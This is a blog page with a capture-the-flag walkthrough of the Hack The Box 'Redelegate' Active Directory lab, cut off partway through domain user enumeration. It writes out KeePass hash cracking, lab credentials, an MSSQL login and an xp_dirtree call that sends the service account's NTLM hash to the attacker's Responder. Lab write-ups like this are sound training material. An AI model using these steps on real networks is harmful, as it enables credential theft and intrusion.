@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Redelegate VulnLab - Complete Walkthrough &amp; WriteupIntroductionWelcome to my complete walkthrough of Redelegate from Hack The Box - VulnLab! This challenging Active Directory machine tests your un">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Redelegate">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Redelegate VulnLab - Complete Walkthrough &amp; WriteupIntroductionWelcome to my complete walkthrough of Redelegate from Hack The Box - VulnLab! This challenging Active Directory machine tests your un">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/ftp-redelegate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/mssql-redelegate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/xp_dirtree-redelagate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/brute-user-msssql.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/good-path-redelaagate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/all-perms-bloodhound.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/winrm-redelagate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Redelegate/whomai-helen-frost.png">
+<meta property="article:published_time" content="2025-10-21T11:48:16.000Z">
+<meta property="article:modified_time" content="2025-10-21T11:52:07.509Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="VulnLab">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Redelegate/ftp-redelegate.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-Redelegate</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/20/HTB-Postman/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&text=HTB-Redelegate"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&is_video=false&description=HTB-Redelegate"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Redelegate&body=Check out this article: https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&title=HTB-Redelegate"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&name=HTB-Redelegate&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/21/HTB-Redelegate/&t=HTB-Redelegate"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redelegate-VulnLab-Complete-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Redelegate VulnLab - Complete Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Anonymous-Access"><span class="toc-number">1.2.2.</span> <span class="toc-text">FTP Anonymous Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-KeePass-Database"><span class="toc-number">1.3.</span> <span class="toc-text">Cracking the KeePass Database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-the-Hash"><span class="toc-number">1.3.1.</span> <span class="toc-text">Extracting the Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Cracking-Attempt"><span class="toc-number">1.3.2.</span> <span class="toc-text">Initial Cracking Attempt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generating-Custom-Wordlist"><span class="toc-number">1.3.3.</span> <span class="toc-text">Generating Custom Wordlist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeePass-Database-Contents"><span class="toc-number">1.3.4.</span> <span class="toc-text">KeePass Database Contents</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">MSSQL Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Authenticating-to-MSSQL"><span class="toc-number">1.4.1.</span> <span class="toc-text">Authenticating to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Relay-Attack"><span class="toc-number">1.4.2.</span> <span class="toc-text">Hash Relay Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-User-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Domain User Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1-Metasploit-Module"><span class="toc-number">1.5.1.</span> <span class="toc-text">Method 1: Metasploit Module</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2-Manual-Enumeration"><span class="toc-number">1.5.2.</span> <span class="toc-text">Method 2: Manual Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Discovered-Users"><span class="toc-number">1.5.3.</span> <span class="toc-text">Discovered Users</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Spraying"><span class="toc-number">1.6.</span> <span class="toc-text">Password Spraying</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration-with-BloodHound"><span class="toc-number">1.7.</span> <span class="toc-text">Active Directory Enumeration with BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Analysis"><span class="toc-number">1.7.1.</span> <span class="toc-text">BloodHound Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-to-Helen-Frost"><span class="toc-number">1.8.</span> <span class="toc-text">Lateral Movement to Helen.Frost</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-Privileges"><span class="toc-number">1.8.1.</span> <span class="toc-text">Identifying Privileges</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Administrator"><span class="toc-number">1.9.</span> <span class="toc-text">Privilege Escalation - Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Constrained-Delegation-Abuse"><span class="toc-number">1.9.1.</span> <span class="toc-text">Constrained Delegation Abuse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Changing-FS01-Password"><span class="toc-number">1.9.2.</span> <span class="toc-text">Changing FS01$ Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Requesting-Service-Ticket-with-Impersonation"><span class="toc-number">1.9.3.</span> <span class="toc-text">Requesting Service Ticket with Impersonation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync-Attack"><span class="toc-number">1.9.4.</span> <span class="toc-text">DCSync Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Administrator-Access"><span class="toc-number">1.9.5.</span> <span class="toc-text">Administrator Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-Redelegate
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-21T11:48:16.000Z" class="dt-published" itemprop="datePublished">2025-10-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Redelegate-VulnLab-Complete-Walkthrough-Writeup"><a href="#Redelegate-VulnLab-Complete-Walkthrough-Writeup" class="headerlink" title="Redelegate VulnLab - Complete Walkthrough &amp; Writeup"></a>Redelegate VulnLab - Complete Walkthrough &amp; Writeup</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Welcome to my complete walkthrough of <strong>Redelegate</strong> from Hack The Box - VulnLab! This challenging Active Directory machine tests your understanding of Kerberos delegation attacks, password cracking, and MSSQL enumeration techniques. In this detailed writeup, I’ll walk you through the entire exploitation chain from anonymous FTP access to domain administrator privileges.</p>
+<p><strong>Tools Used:</strong> Nmap, Impacket, Hashcat, Keepass2john, BloodHound, NetExec, Evil-WinRM, BloodyAD, Responder</p>
+<p><strong>Difficulty:</strong> Hard</p>
+<p><strong>Key Techniques:</strong> Anonymous FTP enumeration, KeePass database cracking, MSSQL authentication relay, Active Directory enumeration, Kerberos Constrained Delegation abuse, DCSync attack</p>
+<hr>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p>Starting with our initial port scan, we discover numerous services running on the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| 10-20-24  01:11AM                  434 CyberAudit.txt</span><br><span class="line">| 10-20-24  05:14AM                 2622 Shared.kdbx</span><br><span class="line">|_10-20-24  01:26AM                  580 TrainingAgenda.txt</span><br><span class="line">53/tcp    open  domain?       syn-ack ttl 127</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-21 06:25:37Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal </span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd </span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49932/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 </span><br></pre></td></tr></table></figure>
+
+<p>The key findings from this scan are:</p>
+<ul>
+<li><strong>FTP (Port 21):</strong> Anonymous login enabled with interesting files</li>
+<li><strong>MSSQL (Port 1433):</strong> SQL Server 2019 running</li>
+<li><strong>Kerberos (Port 88):</strong> Domain controller identified</li>
+<li><strong>LDAP (Ports 389&#x2F;3268):</strong> Domain name <code>redelegate.vl</code></li>
+</ul>
+<h3 id="FTP-Anonymous-Access"><a href="#FTP-Anonymous-Access" class="headerlink" title="FTP Anonymous Access"></a>FTP Anonymous Access</h3><p>Since anonymous FTP login is enabled, let’s connect and retrieve the available files:</p>
+<p><img src="/images/Redelegate/ftp-redelegate.png" alt="FTP Anonymous Login"></p>
+<p>The <strong>CyberAudit.txt</strong> file reveals crucial information about recent security findings:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">OCTOBER 2024 AUDIT FINDINGS</span><br><span class="line"></span><br><span class="line">[!] CyberSecurity Audit findings:</span><br><span class="line"></span><br><span class="line">1) Weak User Passwords</span><br><span class="line">2) Excessive Privilege assigned to users</span><br><span class="line">3) Unused Active Directory objects</span><br><span class="line">4) Dangerous Active Directory ACLs</span><br><span class="line"></span><br><span class="line">[*] Remediation steps:</span><br><span class="line"></span><br><span class="line">1) Prompt users to change their passwords: DONE</span><br><span class="line">2) Check privileges for all users and remove high privileges: DONE</span><br><span class="line">3) Remove unused objects in the domain: IN PROGRESS</span><br><span class="line">4) Recheck ACLs: IN PROGRESS</span><br></pre></td></tr></table></figure>
+
+<p>The <strong>TrainingAgenda.txt</strong> file provides an important hint about password formats:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)</span><br><span class="line"></span><br><span class="line">Friday 4th October  | 14.30 - 16.30 - 53 attendees</span><br><span class="line">&quot;Don&#x27;t take the bait&quot; - How to better understand phishing emails and what to do when you see one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Friday 11th October | 15.30 - 17.30 - 61 attendees</span><br><span class="line">&quot;Social Media and their dangers&quot; - What happens to what you post online?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Friday 18th October | 11.30 - 13.30 - 7 attendees</span><br><span class="line">&quot;Weak Passwords&quot; - Why &quot;SeasonYear!&quot; is not a good password </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Friday 25th October | 9.30 - 12.30 - 29 attendees</span><br><span class="line">&quot;What now?&quot; - Consequences of a cyber attack and how to mitigate them% </span><br></pre></td></tr></table></figure>
+
+<p>This training agenda explicitly mentions the weak password format: <strong><code>SeasonYear!</code></strong></p>
+<p>Finally, we discover a <strong>Shared.kdbx</strong> KeePass database that’s password protected.</p>
+<hr>
+<h2 id="Cracking-the-KeePass-Database"><a href="#Cracking-the-KeePass-Database" class="headerlink" title="Cracking the KeePass Database"></a>Cracking the KeePass Database</h2><h3 id="Extracting-the-Hash"><a href="#Extracting-the-Hash" class="headerlink" title="Extracting the Hash"></a>Extracting the Hash</h3><p>First, let’s extract the hash from the KeePass database:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepass2john Shared.kdbx</span><br></pre></td></tr></table></figure>
+
+<h3 id="Initial-Cracking-Attempt"><a href="#Initial-Cracking-Attempt" class="headerlink" title="Initial Cracking Attempt"></a>Initial Cracking Attempt</h3><p>I attempted to crack it using the rockyou.txt wordlist:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 29700 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>However, this doesn’t crack within a reasonable timeframe.</p>
+<h3 id="Generating-Custom-Wordlist"><a href="#Generating-Custom-Wordlist" class="headerlink" title="Generating Custom Wordlist"></a>Generating Custom Wordlist</h3><p>Based on the hint from TrainingAgenda.txt, I created a custom wordlist with the <code>SeasonYear!</code> format:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># gen_seasons_with_fall.py</span></span><br><span class="line"></span><br><span class="line">seasons = [<span class="string">&quot;Spring&quot;</span>, <span class="string">&quot;Summer&quot;</span>, <span class="string">&quot;Autumn&quot;</span>, <span class="string">&quot;Fall&quot;</span>, <span class="string">&quot;Winter&quot;</span>]</span><br><span class="line">symbol = <span class="string">&quot;!&quot;</span></span><br><span class="line">start_year = <span class="number">2010</span></span><br><span class="line">end_year = <span class="number">2030</span></span><br><span class="line"></span><br><span class="line">out_path = <span class="string">&quot;season_years.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(start_year, end_year + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> season <span class="keyword">in</span> seasons:</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;season&#125;</span><span class="subst">&#123;year&#125;</span><span class="subst">&#123;symbol&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Wrote <span class="subst">&#123;(end_year - start_year + <span class="number">1</span>) * <span class="built_in">len</span>(seasons)&#125;</span> lines to <span class="subst">&#123;out_path&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Now crack the hash using our custom wordlist:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat Shared.kdbx.hash season_years.txt --user -m 13400</span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> The password is: <code>Fall2024!</code></p>
+<p><strong>Note:</strong> If you have issues cracking, the .kdbx file might be corrupted. Before downloading with <code>get</code>, type <code>binary</code> in your FTP client to ensure proper transfer.</p>
+<h3 id="KeePass-Database-Contents"><a href="#KeePass-Database-Contents" class="headerlink" title="KeePass Database Contents"></a>KeePass Database Contents</h3><p>Opening the database reveals multiple credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FS01 Admin | Administrator:Spdv41gg4BlBgSYIW1gF</span><br><span class="line">FTP | FTPUser:SguPZBKdRyxWzvXRWy6U</span><br><span class="line">SQL Guest Access | SQLGuest:zDPBpaF4FywlqIv11vii</span><br><span class="line">WEB01 | WordPress Panel:cn4KOEgsHqvKXPjEnSD9</span><br><span class="line">KeyFob Combination | 22331144</span><br><span class="line">Payrol App | Payroll:cVkqz4bCM7kJRcd62vqi5X</span><br><span class="line">Timesheet Manager | Timesheet:hMFS4I0Kj8Rcd62vqi5X</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="MSSQL-Exploitation"><a href="#MSSQL-Exploitation" class="headerlink" title="MSSQL Exploitation"></a>MSSQL Exploitation</h2><h3 id="Authenticating-to-MSSQL"><a href="#Authenticating-to-MSSQL" class="headerlink" title="Authenticating to MSSQL"></a>Authenticating to MSSQL</h3><p>From our Nmap scan, we know MSSQL is running. Let’s use the SQLGuest credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient redelegate/SQLGuest:&#x27;zDPBpaF4FywlqIv11vii&#x27;@dc.redelegate.vl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redelegate/mssql-redelegate.png" alt="MSSQL Authentication"></p>
+<h3 id="Hash-Relay-Attack"><a href="#Hash-Relay-Attack" class="headerlink" title="Hash Relay Attack"></a>Hash Relay Attack</h3><p>The SQLGuest user has permission to execute <code>xp_dirtree</code>, which we can abuse to relay the hash of the sql_svc account back to ourselves.</p>
+<p>Start Responder in one terminal:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+
+<p>Then execute the following in MSSQL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree \\(Your ip)\shared</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Redelegate/xp_dirtree-redelagate.png" alt="XP_Dirtree Hash Capture"></p>
+<p>Unfortunately, the captured hash doesn’t crack, so we need to try a different approach.</p>
+<hr>
+<h2 id="Domain-User-Enumeration"><a href="#Domain-User-Enumeration" class="headerlink" title="Domain User Enumeration"></a>Domain User Enumeration</h2><h3 id="Method-1-Metasploit-Module"><a href="#Method-1-Metasploit-Module" class="headerlink" title="Method 1: Metasploit Module"></a>Method 1: Metasploit Module</h3><p>You can use the Metasploit module <code>auxiliary/admin/mssql/mssql_enum_domain_accounts</code> to enumerate domain users.</p>
+<h3 id="Method-2-Manual-Enumeration"><a href="#Method-2-Manual-Enumeration" class="headerlink" title="Method 2: Manual Enumeration"></a>Method 2: Manual Enumeration</h3><p>However, during real penetration tests, you might not have access to these tools. Here’s the manual method:</p>
+<p><strong>Step 1:</strong> Select the domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL (SQLGuest  guest@master)&gt; select DEFAULT_DOMAIN() as mydomain;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2:</strong> Get the domain SID:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL (SQLGuest  guest@master)&gt; select SUSER_SID(&#x27;REDELEGATE\Domain Admins&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3:</strong> Remove the <code>00020000</code> from the end (this is the RID of the Domain Admins group).</p>
+<p><strong>Step 4:</strong> Use the following script to brute force user accounts:</p>
